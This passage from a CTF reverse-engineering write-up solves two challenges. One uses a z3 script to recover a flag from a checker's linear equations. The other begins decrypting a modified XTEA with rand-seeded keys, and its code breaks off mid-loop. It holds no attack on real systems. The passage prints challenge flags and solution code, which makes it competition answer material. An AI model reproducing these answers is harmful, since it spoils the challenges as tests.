punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">20</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">99</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">10</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">707</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">250</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">666</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token operator">-</span><span class="token number">9</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">90</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token operator">-</span><span class="token number">2</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">609</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">21</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">2</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">24</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">25</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">26</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">27</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">777044</span><span class="token punctuation">,</span>
         <span class="token number">177</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">22</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">699</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">64</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">56</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">96</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">66</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">60</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">20</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">99</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">10</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">707</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">250</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">666</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token operator">-</span><span class="token number">9</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token operator">-</span><span class="token number">2</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">69</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">21</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">222</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">224</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">25</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">26</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">27</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">28</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">185016</span><span class="token punctuation">,</span>
         <span class="token number">77</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">96</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">9</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">6</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">96</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">0</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">20</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">99</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">10</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">707</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">250</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">666</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token operator">-</span><span class="token number">9</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token operator">-</span><span class="token number">2</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">9</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">0</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">21</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">222</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">23</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">224</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">26</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token operator">-</span><span class="token number">58</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">27</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">2</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">29</span> <span class="token operator">*</span> i11i1Iii1I1<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">130106</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> <span class="token builtin">all</span><span class="token punctuation">(</span>ii1iIi1i11i<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Congratulation!!!"</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"wrong_wrong!!!"</span><span class="token punctuation">)</span></code></pre>

<p>是计下flag里面每个字符出现的次数检验是否符合那个字符串的格式化的对应次数，</p>
<p>将下面的z3解出可以得到一个字符串<strong>H1Z1N1U1C1T1F1{1a6d275f7-463}</strong></p>
<p>一个字符一个数字配对，代表该字符在原flag中出现的次数。</p>
<p>除去前面HZNUCTF{，将括号内的字母和对应数字做映射，利用原代码中的**”111111116257645365477364777645752361”**去一一对应。</p>
<p>解密代码：</p>
<pre class="language-Python" data-language="Python"><code class="language-Python">from z3 import *

def decrypt(encrypted):
    mapping &#x3D; &quot;6257645365477364777645752361&quot;
    
    char_map &#x3D; &#123;&#125;

    remaining_map &#x3D; &#123;
        &#39;6&#39;: &#39;a&#39;,
        &#39;2&#39;: &#39;d&#39;,
        &#39;5&#39;: &#39;7&#39;,
        &#39;7&#39;: &#39;f&#39;,
        &#39;4&#39;: &#39;-&#39;,
        &#39;3&#39;: &#39;6&#39;,
        &#39;1&#39;: &#39;&#125;&#39;
    &#125;
    char_map.update(remaining_map)
    
    result &#x3D; &quot;HZNUCTF&#123;&quot;
    for num in mapping:
        result +&#x3D; char_map[num]
    
    return result

s &#x3D; Solver()

Enc &#x3D; [Int(f&#39;x&#123;i&#125;&#39;) for i in range(30)]

s.add(7 * Enc[0] &#x3D;&#x3D; 504)
s.add(9 * Enc[0] - 5 * Enc[1] &#x3D;&#x3D; 403)
s.add((2 * Enc[0] - 5 * Enc[1]) + 10 * Enc[2] &#x3D;&#x3D; 799)
s.add(3 * Enc[0] + 8 * Enc[1] + 15 * Enc[2] + 20 * Enc[3] &#x3D;&#x3D; 2938)
s.add((5 * Enc[0] + 15 * Enc[1] + 20 * Enc[2] - 19 * Enc[3]) + 1 * Enc[4] &#x3D;&#x3D; 2042)
s.add((7 * Enc[0] + 1 * Enc[1] + 9 * Enc[2] - 11 * Enc[3]) + 2 * Enc[4] + 5 * Enc[5] &#x3D;&#x3D; 1225)
s.add(11 * Enc[0] + 22 * Enc[1] + 33 * Enc[2] + 44 * Enc[3] + 55 * Enc[4] + 66 * Enc[5] - 77 * Enc[6] &#x3D;&#x3D; 7975)
s.add(((21 * Enc[0] + 23 * Enc[1] + 3 * Enc[2] + 24 * Enc[3] - 55 * Enc[4]) + 6 * Enc[5] - 7 * Enc[6]) + 15 * Enc[7] &#x3D;&#x3D; 229)
s.add((2 * Enc[0] + 26 * Enc[1] + 13 * Enc[2] + 0 * Enc[3] - 65 * Enc[4]) + 15 * Enc[5] + 29 * Enc[6] + 1 * Enc[7] + 20 * Enc[8] &#x3D;&#x3D; 2107)
s.add((10 * Enc[0] + 7 * Enc[1] + -9 * Enc[2] + 6 * Enc[3] + 7 * Enc[4] + 1 * Enc[5] + 22 * Enc[6] + 21 * Enc[7] - 22 * Enc[8]) + 30 * Enc[9] &#x3D;&#x3D; 4037)
s.add((15 * Enc[0] + 59 * Enc[1] + 56 * Enc[2] + 66 * Enc[3] + 7 * Enc[4] + 1 * Enc[5] - 122 * Enc[6]) + 21 * Enc[7] + 32 * Enc[8] + 3 * Enc[9] - 10 * Enc[10] &#x3D;&#x3D; 4950)
s.add((((13 * Enc[0] + 66 * Enc[1] + 29 * Enc[2] + 39 * Enc[3] - 33 * Enc[4]) + 13 * Enc[5] - 2 * Enc[6]) + 42 * Enc[7] + 62 * Enc[8] + 1 * Enc[9] - 10 * Enc[10]) + 11 * Enc[11] &#x3D;&#x3D; 12544)
s.add((((23 * Enc[0] + 6 * Enc[1] + 29 * Enc[2] + 3 * Enc[3] - 3 * Enc[4]) + 63 * Enc[5] - 25 * Enc[6]) + 2 * Enc[7] + 32 * Enc[8] + 1 * Enc[9] - 10 * Enc[10]) + 11 * Enc[11] - 12 * Enc[12] &#x3D;&#x3D; 6585)
s.add(((((223 * Enc[0] + 6 * Enc[1] - 29 * Enc[2] - 53 * Enc[3] - 3 * Enc[4]) + 3 * Enc[5] - 65 * Enc[6]) + 0 * Enc[7] + 36 * Enc[8] + 1 * Enc[9] - 15 * Enc[10]) + 16 * Enc[11] - 18 * Enc[12]) + 13 * Enc[13] &#x3D;&#x3D; 6893)
s.add(((((29 * Enc[0] + 13 * Enc[1] - 9 * Enc[2] - 93 * Enc[3]) + 33 * Enc[4] + 6 * Enc[5] + 65 * Enc[6] + 1 * Enc[7] - 36 * Enc[8]) + 0 * Enc[9] - 16 * Enc[10]) + 96 * Enc[11] - 68 * Enc[12]) + 33 * Enc[13] - 14 * Enc[14] &#x3D;&#x3D; 1883)
s.add((((69 * Enc[0] + 77 * Enc[1] - 93 * Enc[2] - 12 * Enc[3]) + 0 * Enc[4] + 0 * Enc[5] + 1 * Enc[6] + 16 * Enc[7] + 36 * Enc[8] + 6 * Enc[9] + 19 * Enc[10] + 66 * Enc[11] - 8 * Enc[12]) + 38 * Enc[13] - 16 * Enc[14]) + 15 * Enc[15] &#x3D;&#x3D; 8257)
s.add(((((23 * Enc[0] + 2 * Enc[1] - 3 * Enc[2] - 11 * Enc[3]) + 12 * Enc[4] + 24 * Enc[5] + 1 * Enc[6] + 6 * Enc[7] + 14 * Enc[8] - 0 * Enc[9]) + 1 * Enc[10] + 68 * Enc[11] - 18 * Enc[12]) + 68 * Enc[13] - 26 * Enc[14]) + 15 * Enc[15] - 16 * Enc[16] &#x3D;&#x3D; 5847)
s.add((((((24 * Enc[0] + 0 * Enc[1] - 1 * Enc[2] - 15 * Enc[3]) + 13 * Enc[4] + 4 * Enc[5] + 16 * Enc[6] + 67 * Enc[7] + 146 * Enc[8] - 50 * Enc[9]) + 16 * Enc[10] + 6 * Enc[11] - 1 * Enc[12]) + 69 * Enc[13] - 27 * Enc[14]) + 45 * Enc[15] - 6 * Enc[16]) + 17 * Enc[17] &#x3D;&#x3D; 18257)
s.add(((((25 * Enc[0] + 26 * Enc[1] - 89 * Enc[2]) + 16 * Enc[3] + 19 * Enc[4] + 44 * Enc[5] + 36 * Enc[6] + 66 * Enc[7] - 150 * Enc[8] - 250 * Enc[9]) + 166 * Enc[10] + 126 * Enc[11] - 11 * Enc[12]) + 690 * Enc[13] - 207 * Enc[14]) + 46 * Enc[15] + 6 * Enc[16] + 7 * Enc[17] - 18 * Enc[18] &#x3D;&#x3D; 12591)
s.add((((((5 * Enc[0] + 26 * Enc[1] + 8 * Enc[2] + 160 * Enc[3] + 9 * Enc[4] - 4 * Enc[5]) + 36 * Enc[6] + 6 * Enc[7] - 15 * Enc[8] - 20 * Enc[9]) + 66 * Enc[10] + 16 * Enc[11] - 1 * Enc[12]) + 690 * Enc[13] - 20 * Enc[14]) + 46 * Enc[15] + 6 * Enc[16] + 7 * Enc[17] - 18 * Enc[18]) + 19 * Enc[19] &#x3D;&#x3D; 52041)
s.add(((((((29 * Enc[0] - 26 * Enc[1]) + 0 * Enc[2] + 60 * Enc[3] + 90 * Enc[4] - 4 * Enc[5]) + 6 * Enc[6] + 6 * Enc[7] - 16 * Enc[8] - 21 * Enc[9]) + 69 * Enc[10] + 6 * Enc[11] - 12 * Enc[12]) + 69 * Enc[13] - 20 * Enc[14] - 46 * Enc[15]) + 65 * Enc[16] + 0 * Enc[17] - 1 * Enc[18]) + 39 * Enc[19] - 20 * Enc[20] &#x3D;&#x3D; 20253)
s.add((((((((45 * Enc[0] - 56 * Enc[1]) + 10 * Enc[2] + 650 * Enc[3] - 900 * Enc[4]) + 44 * Enc[5] + 66 * Enc[6] - 6 * Enc[7] - 6 * Enc[8] - 21 * Enc[9]) + 9 * Enc[10] - 6 * Enc[11] - 12 * Enc[12]) + 69 * Enc[13] - 2 * Enc[14] - 406 * Enc[15]) + 651 * Enc[16] + 2 * Enc[17] - 10 * Enc[18]) + 69 * Enc[19] - 0 * Enc[20]) + 21 * Enc[21] &#x3D;&#x3D; 18768)
s.add((((((555 * Enc[0] - 6666 * Enc[1]) + 70 * Enc[2] + 510 * Enc[3] - 90 * Enc[4]) + 499 * Enc[5] + 66 * Enc[6] - 66 * Enc[7] - 610 * Enc[8] - 221 * Enc[9]) + 9 * Enc[10] - 23 * Enc[11] - 102 * Enc[12]) + 6 * Enc[13] + 2050 * Enc[14] - 406 * Enc[15]) + 665 * Enc[16] + 333 * Enc[17] + 100 * Enc[18] + 609 * Enc[19] + 777 * Enc[20] + 201 * Enc[21] - 22 * Enc[22] &#x3D;&#x3D; 111844)
s.add((((((((1 * Enc[0] - 22 * Enc[1]) + 333 * Enc[2] + 4444 * Enc[3] - 5555 * Enc[4]) + 6666 * Enc[5] - 666 * Enc[6]) + 676 * Enc[7] - 660 * Enc[8] - 22 * Enc[9]) + 9 * Enc[10] - 73 * Enc[11] - 107 * Enc[12]) + 6 * Enc[13] + 250 * Enc[14] - 6 * Enc[15]) + 65 * Enc[16] + 39 * Enc[17] + 10 * Enc[18] + 69 * Enc[19] + 777 * Enc[20] + 201 * Enc[21] - 2 * Enc[22]) + 23 * Enc[23] &#x3D;&#x3D; 159029)
s.add((((520 * Enc[0] - 222 * Enc[1]) + 333 * Enc[2] + 4 * Enc[3] - 56655 * Enc[4]) + 6666 * Enc[5] + 666 * Enc[6] + 66 * Enc[7] - 60 * Enc[8] - 220 * Enc[9]) + 99 * Enc[10] + 73 * Enc[11] + 1007 * Enc[12] + 7777 * Enc[13] + 2500 * Enc[14] + 6666 * Enc[15] + 605 * Enc[16] + 390 * Enc[17] + 100 * Enc[18] + 609 * Enc[19] + 99999 * Enc[20] + 210 * Enc[21] + 232 * Enc[22] + 23 * Enc[23] - 24 * Enc[24] &#x3D;&#x3D; 2762025)
s.add(((((1323 * Enc[0] - 22 * Enc[1]) + 333 * Enc[2] + 4 * Enc[3] - 55 * Enc[4]) + 666 * Enc[5] + 666 * Enc[6] + 66 * Enc[7] - 660 * Enc[8] - 220 * Enc[9]) + 99 * Enc[10] + 3 * Enc[11] + 100 * Enc[12] + 777 * Enc[13] + 2500 * Enc[14] + 6666 * Enc[15] + 605 * Enc[16] + 390 * Enc[17] + 100 * Enc[18] + 609 * Enc[19] + 9999 * Enc[20] + 210 * Enc[21] + 232 * Enc[22] + 23 * Enc[23] - 24 * Enc[24]) + 25 * Enc[25] &#x3D;&#x3D; 1551621)
s.add((((((777 * Enc[0] - 22 * Enc[1]) + 6969 * Enc[2] + 4 * Enc[3] - 55 * Enc[4]) + 666 * Enc[5] - 6 * Enc[6]) + 96 * Enc[7] - 60 * Enc[8] - 220 * Enc[9]) + 99 * Enc[10] + 3 * Enc[11] + 100 * Enc[12] + 777 * Enc[13] + 250 * Enc[14] + 666 * Enc[15] + 65 * Enc[16] + 90 * Enc[17] + 100 * Enc[18] + 609 * Enc[19] + 999 * Enc[20] + 21 * Enc[21] + 232 * Enc[22] + 23 * Enc[23] - 24 * Enc[24]) + 25 * Enc[25] - 26 * Enc[26] &#x3D;&#x3D; 948348)
s.add(((((((97 * Enc[0] - 22 * Enc[1]) + 6969 * Enc[2] + 4 * Enc[3] - 56 * Enc[4]) + 96 * Enc[5] - 6 * Enc[6]) + 96 * Enc[7] - 60 * Enc[8] - 20 * Enc[9]) + 99 * Enc[10] + 3 * Enc[11] + 10 * Enc[12] + 707 * Enc[13] + 250 * Enc[14] + 666 * Enc[15] + -9 * Enc[16] + 90 * Enc[17] + -2 * Enc[18] + 609 * Enc[19] + 0 * Enc[20] + 21 * Enc[21] + 2 * Enc[22] + 23 * Enc[23] - 24 * Enc[24]) + 25 * Enc[25] - 26 * Enc[26]) + 27 * Enc[27] &#x3D;&#x3D; 777044)
s.add((((((177 * Enc[0] - 22 * Enc[1]) + 699 * Enc[2] + 64 * Enc[3] - 56 * Enc[4] - 96 * Enc[5] - 66 * Enc[6]) + 96 * Enc[7] - 60 * Enc[8] - 20 * Enc[9]) + 99 * Enc[10] + 3 * Enc[11] + 10 * Enc[12] + 707 * Enc[13] + 250 * Enc[14] + 666 * Enc[15] + -9 * Enc[16] + 0 * Enc[17] + -2 * Enc[18] + 69 * Enc[19] + 0 * Enc[20] + 21 * Enc[21] + 222 * Enc[22] + 23 * Enc[23] - 224 * Enc[24]) + 25 * Enc[25] - 26 * Enc[26]) + 27 * Enc[27] - 28 * Enc[28] &#x3D;&#x3D; 185016)
s.add(((((((77 * Enc[0] - 2 * Enc[1]) + 6 * Enc[2] + 6 * Enc[3] - 96 * Enc[4] - 9 * Enc[5] - 6 * Enc[6]) + 96 * Enc[7] - 0 * Enc[8] - 20 * Enc[9]) + 99 * Enc[10] + 3 * Enc[11] + 10 * Enc[12] + 707 * Enc[13] + 250 * Enc[14] + 666 * Enc[15] + -9 * Enc[16] + 0 * Enc[17] + -2 * Enc[18] + 9 * Enc[19] + 0 * Enc[20] + 21 * Enc[21] + 222 * Enc[22] + 23 * Enc[23] - 224 * Enc[24]) + 26 * Enc[25] - -58 * Enc[26]) + 27 * Enc[27] - 2 * Enc[28]) + 29 * Enc[29] &#x3D;&#x3D; 130106)

for x in Enc:
    s.add(x &gt;&#x3D; 32)
    s.add(x &lt;&#x3D; 126)

if s.check() &#x3D;&#x3D; sat:
    m &#x3D; s.model()

    solution &#x3D; [m[x].as_long() if m[x] is not None else 0 for x in Enc]
    
    decrypted &#x3D; decrypt(solution)
    print(decrypted)
    
else:
    print(&quot;No solution found&quot;)</code></pre>

<p>HZNUCTF{ad7fa-76a7-ff6a-fffa-7f7d6a}</p>
<h3 id="XTEA"><a href="#XTEA" class="headerlink" title="XTEA"></a>XTEA</h3><p>初始化置种子srand了一次，然后这边里面判断是否有调试，然后又srand了一遍，可以忽略，种子就是0x7E8。</p>
<p>红框处是将输入字符串四个四个一组进行翻转。</p>
<p><img src="/images/1744633170177-8.png" alt="img" loading="lazy"></p>
<p>InitKey函数是用rand初始化了四个整数Key。</p>
<p><img src="/images/1744633170177-9.png" alt="img" loading="lazy"></p>
<p>XTea是魔改的，Delta是靠用户输入传进来的，那么这边Delta未知就需要爆破。</p>
<p><img src="/images/1744633170177-10.png" alt="img" loading="lazy"></p>
<p>题目描述说有点misc味，发现附件中还有个readme里面的压缩包密码就是标准Delta，<strong>2654435769 -&gt; 0x9E3779B9</strong></p>
<p>直接编写解密，使用该Delta就可以解出flag。</p>
<p>解密代码：</p>
<pre class="language-c++" data-language="c++"><code class="language-c++">#include &lt;iostream&gt;
#include &lt;windows.h&gt;
#include &lt;string&gt;
#include &lt;time.h&gt;

unsigned int *__fastcall dec(int a1, unsigned int *a2, unsigned int *a3, unsigned int a4)
&#123;
    unsigned int *result; &#x2F;&#x2F; rax
    unsigned int v5;      &#x2F;&#x2F; [rsp+24h] [rbp+4h]
    unsigned int v6;      &#x2F;&#x2F; [rsp+44h] [rbp+24h]
    unsigned int v7;      &#x2F;&#x2F; [rsp+64h] [rbp+44h]
    int i;                &#x2F;&#x2F; [rsp+84h] [rbp+64h]

    v5 &#x3D; *a2;
    v6 &#x3D; *a3;
    v7 &#x3D; 0;
    v7 &#x3D; -a1 * 32;
    for (i &#x3D; 0; i &lt; 32; ++i)
    &#123;
        v6 -&#x3D; (*(DWORD *)(a4 + 4LL * ((v7 &gt;&gt; 11) &amp; 3)) + v7) ^ (v5 + ((v5 &gt;&gt; 5) ^ (16 * v5)));
        v7 +&#x3D; a1;
        v5 -&#x3D; (*(DWORD *)(a4 + 4LL * (v7 &amp; 3)) + v7) ^ (v6 + ((v6 &gt;&gt; 5) ^ (16 * v6)));
    &#125;
    *a2 &#x3D; v5;
    result &#x3D; a3;
    *a3 &#x3D; v6;
    return result;
&#125;

int main()
&#123;
    unsigned char buffer[] &#x3D; &#123;
        0x24, 0x23, 0xCB, 0x8C, 0x1A, 0x74, 0xA7, 0x09,
        0x8D, 0x67, 0x3C, 0xFB, 0x79, 0x3A, 0x08, 0xF6,
        0x1B, 0x24, 0xCC, 0xF1, 0xF2, 0x59, 0xFA, 0x39,
        0xCC, 0xE1, 0xAB, 0xF2, 0x72, 0x9F, 0x18, 0x17&#125;;
    srand(0x7e8);
    &#x2F;&#x2F; 初始化Key
    uint32_t key[4]&#123;&#125;;
    for (int i &#x3D; 0; i &lt; 4; i++)
        key[i] &#x3D; rand();

    for (int j &#x3D; 7; j &gt; 0; j--)
        dec(0x9E3779B9, (unsigned int *)(buffer + (j - 1) * 4), (unsigned int *)(buffer + j * 4), (uint32_t)key);

